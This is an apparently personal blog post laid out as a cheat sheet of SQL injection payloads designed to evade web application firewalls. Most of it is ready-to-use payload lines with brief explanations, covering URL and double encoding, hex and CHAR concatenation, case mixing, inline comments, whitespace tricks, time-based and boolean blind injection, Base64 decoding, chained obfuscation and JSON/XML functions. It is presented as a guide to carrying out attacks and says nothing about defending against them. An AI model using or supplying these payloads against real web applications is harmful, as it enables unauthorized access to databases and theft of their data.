---
title: "WAF Bypass Techniques for SQL Injection"
tags: ['Hacking', 'SQL Injection', 'WAF']
date: 2024-10-03
toc: true
unlisted: true
author: 'Ren'
authorlink: 'https://about.0x0060.dev/'
---

## WAF Bypass Techniques for SQL Injection

Below are various methods to bypass WAFs and execute SQL injection attacks. Each technique takes advantage of different obfuscation, encoding, and manipulation strategies to evade detection.

### 1. Using Encoding and Obfuscation

#### URL Encoding

```  
%27%20UNION%20SELECT%20NULL,NULL,NULL--  
```

Encode parts of the payload to bypass basic keyword detection mechanisms used by WAFs.

#### Double URL Encoding

```  
%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--  
```

Double encode the payload to evade more sophisticated detection mechanisms.

#### Hex Encoding

```  
' UNION SELECT 0x61646D696E, 0x70617373776F7264 --  
```

Use hexadecimal encoding for the payload to obscure the SQL commands.

### 2. Case Manipulation and Comments

#### Mixed Case

```  
' uNioN SeLecT NULL, NULL --  
```

Change the case of SQL keywords to avoid case-sensitive filters.

#### Inline Comments

```  
' UNION/**/SELECT/**/NULL,NULL --  
```

Insert comments within SQL keywords to break up recognizable patterns.

### 3. Whitespace and Special Characters

#### Using Different Whitespace Characters

```  
' UNION%0D%0ASELECT%0D%0A NULL,NULL --  
```

Replace spaces with other whitespace characters like tabs or newlines to confuse simple string-matching filters.

#### Concatenation with Special Characters

```  
' UNION SELECT CHAR(117)||CHAR(115)||CHAR(101)||CHAR(114), CHAR(112)||CHAR(97)||CHAR(115)||CHAR(115) --  
```

Use special characters and concatenation functions to dynamically build the payload.

### 4. SQL Function and Command Obfuscation

#### String Concatenation

```  
' UNION SELECT 'ad'||'min', 'pa'||'ss' --  
```

Break strings into smaller parts and concatenate them to obscure the payload.

#### Using SQL Functions

```  
' UNION SELECT VERSION(), DATABASE() --  
```

Leverage SQL functions to manipulate and obfuscate the payload.

### 5. Time-Based and Boolean-Based Payloads

#### Time-Based Blind SQL Injection

```  
' AND IF(1=1, SLEEP(5), 0) --  
```

Use time delays to infer information based on the response time.

#### Boolean-Based Blind SQL Injection

```  
' AND IF(1=1, 'A', 'B')='A' --  
```

Use conditional statements to alter the response based on true or false conditions.

### 6. Advanced Encoding Techniques

#### Base64 Encoding

```  
' UNION SELECT FROM_BASE64('c2VsZWN0IHZlcnNpb24oKQ==') --  
```

Encode payloads using Base64 to bypass content filters.

#### Custom Encoding Scripts

Develop custom scripts to encode and decode payloads in different formats to evade detection.

### 7. Chaining Techniques

#### Combining Multiple Bypass Techniques

```  
%27%20UNION/**/SELECT/**/CHAR(117)%7C%7CCHAR(115)%7C%7CCHAR(101)%7C%7CCHAR(114),%20CHAR(112)%7C%7CCHAR(97)%7C%7CCHAR(115)%7C%7CCHAR(115)%20--%0A  
```

Combine various techniques to create more complex and harder-to-detect payloads.

### 8. Leveraging Lesser-Known SQL Features

#### Using JSON Functions

```  
' UNION SELECT json_extract(column_name, '$.key') FROM table_name --  
```

Leverage JSON functions to manipulate and extract data in a more complex manner.

#### Using XML Functions

```  
' UNION SELECT extractvalue(1, 'version()') --  
```

Utilize XML functions to construct more sophisticated payloads.